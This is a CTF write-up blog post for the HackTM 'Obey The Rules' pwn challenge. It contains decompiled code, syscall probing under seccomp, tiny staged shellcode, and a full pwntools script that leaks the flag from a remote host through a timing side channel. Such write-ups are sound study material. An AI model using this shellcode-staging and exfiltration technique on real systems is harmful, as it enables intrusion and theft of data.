---
layout: post
category: Pwn
title: HackTM - Obey The Rules
tags: 
    - kowu
---

Obey the rules was a simple pwning / shellcoding challenge at HackTM. Loading in r2 we see the following:

```
user@KARCH ~/ctf/rules % r2 obey_the_rules
 -- Press any key to continue ...
[0x00400a70]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400a70]> s main
[0x00400ce1]> pdg

undefined8 main(void)
{
    int64_t iVar1;
    int32_t iVar2;
    undefined8 uVar3;
    int64_t in_FS_OFFSET;
    int64_t var_84h;
    int64_t var_78h;
    int64_t var_70h;
    int64_t var_8h;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.init_proc();
    sym.imp.memset(&var_70h, 0, 100);
    sym.open_read_file((int64_t)"header.txt", 100, (int64_t)&var_70h);
    sym.imp.puts(&var_70h);
    var_84h._0_4_ = sym.open_read_file((int64_t)"description.txt", 800, (int64_t)obj.description);
    sym.imp.printf("\n    %s\n  ", obj.description);
    sym.imp.puts(" >> Do you Obey? (yes / no)");
    sym.imp.read(0, obj.answer, 0xb);
    var_84h._0_4_ = sym.open_read_file((int64_t)"RULES.txt", 0x96, (int64_t)obj.rules);
    var_84h._4_2_ = (undefined2)((int32_t)var_84h >> 3);
    iVar2 = sym.imp.prctl(0x26, 1, 0, 0, 0);
    if (iVar2 < 0) {
        sym.imp.perror("prctl(PR_SET_NO_NEW_PRIVS)");
    // WARNING: Subroutine does not return
        sym.imp.exit(2);
    }
    iVar2 = sym.imp.prctl(0x16, 2, (int64_t)&var_84h + 4);
    if (iVar2 < 0) {
        sym.imp.perror("prctl(PR_SET_SECCOMP)");
    // WARNING: Subroutine does not return
        sym.imp.exit(2);
    }
    iVar2 = sym.imp.strcmp(obj.answer, "Y");
    if (iVar2 == 0) {
        sym.set_context();
    } else {
        sym.imp.system("/bin/sh");
    }
    uVar3 = 0;
    if (iVar1 != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar3 = sym.imp.__stack_chk_fail();
    }
    return uVar3;
}

[0x00400ce1]> pdg @sym.set_context

void sym.set_context(void)
{
    int64_t iVar1;
    int64_t var_8h;
    
    iVar1 = sym.imp.strlen(obj.answer);
    obj.answer[iVar1] = (code)0x59;
    sym.imp.strcpy(_obj.region, obj.answer);
    (*_obj.region)(0x539);
    return;
}
[0x00400ce1]> 
```
First of all, we see that the r2 ghidra plugin is nice for quick decompilation needs. Second, we see what the challenge does:
 - printing some fancy headers
 - reading a maximum of 11 Bytes from stdin
 - loading seccomp rules unknown to us out of a file
 - if the input is "Y\0", it will jump into our sumbitted input and executes it (the nullybte is replaced by another 'Y')
 - else it executes /bin/sh, which is killed due to seccomp

So after excluding "Y\0" we have a total of 9 bytes left for shellcode.

## Testing for allowed syscalls

First I checked which syscalls are allowed. If a syscall was forbidden, it would report `illegal instruction`, else a `segmentation fault` occurs.
As we could not use nullbytes due to the strcpy, i checked the syscall id 0 case manually and used the following code for the other syscalls up to 255:
```
xor rax, rax;
mov al, {nr};
syscall;
ud2;
```
Which compiles down to exactly 9 bytes. The ud2 is optional and should just crash immediately if the syscall succeeded.
I found out that the syscalls (0 read, 2 open, 60 exit) are allowed.
That's enough to work with as the flag location was given and even if a write is lacking I could just use some sidechannel to exfiltrate the flag.

## Getting unlimited RCE

To get unlimited RCE I planned to reread additonal shellcode by using something like read(0, $rip, amount). We need to get:
 - rax = 0
 - rdi = 0
 - rsi = $rip
 - rdx = amount

The only "trick" I used to save bytes was using `push rbx; pop rax;` (2 bytes) instead of moving registers with `mov rax, rbx;` (3 bytes).
For getting rax = rdi = 0 I used the fact that register rbx would always be zero, which lead to the following shellcode.
```
push rbx;
push rbx;
pop rax;
pop rdi;
```
To get rsi right in front of our $rip I used the fact that the current top of stack just holds exactly that value.
```
pop rsi;
```
Lastly I wanted to read some bigger amount, so I just wrote 0xff to rdx's high byte.
```
mov dh, 0xff;
```
Two bytes left for the syscall, we are ready to overwrite the code at $rip :)
```
syscall;
```

## Sidechannels and Profit

For exfiltrating the flag there are two sidechannels which came to my mind.
 - timing based (burn cpu cycles using some loop)
 - blocked syscall based (1/0 oracle by calling a blocked syscall or exit normally)

I decided to go with the timing one. To speed things up one could implement fancy stuff like a binary search or burn CPU power depending on the currently exfiltrated character with that approach. I did not.
So here is the final script stupidly bruteforcing all possibilities. Notice that I open the file twice to increment the fd id. Because the seccomp filter seemed to block read syscalls with fd==3.

```python
from pwn import *
import time

context.clear(arch='amd64')

payload1 = asm(
    """
    push rbx;
    push rbx;
    pop rax;
    pop rdi;
    pop rsi;
    mov dh, 0xff;
    syscall;
    """
)
assert len(payload1) < 10

payload2 = (
        shellcraft.open('/home/pwn/flag.txt') +
        shellcraft.open('/home/pwn/flag.txt') +
        shellcraft.read(fd='rax', buffer='rsp', count=0x100) +
        'xor rcx, rcx;' +
        'mov al, [rsp + {}];' +
        'cmp al, {};' +
        'jne done;' +
        'mov rcx, 0x3ffffff;' +
        'times:\nloop times;done:;' +
        shellcraft.exit(0)
)


def sploit(r, idx, ch):
    r.send('Y\0' + payload1.ljust(9, '\x90') + '\x90' * 11 + asm(payload2.format(idx, ch)))


if __name__ == '__main__':
    flag = ''

    while True:
        print(flag)
        for c in string.printable:
            r = remote('138.68.67.161', 20001)
            r.recvuntil('>>')
            sploit(r, len(flag), ord(c))
            a = time.time()
            try:
                r.recvuntil('yeet')
            except EOFError:
                pass
            if time.time() - a > 0.8:
                flag += c
                break
            r.close()
```
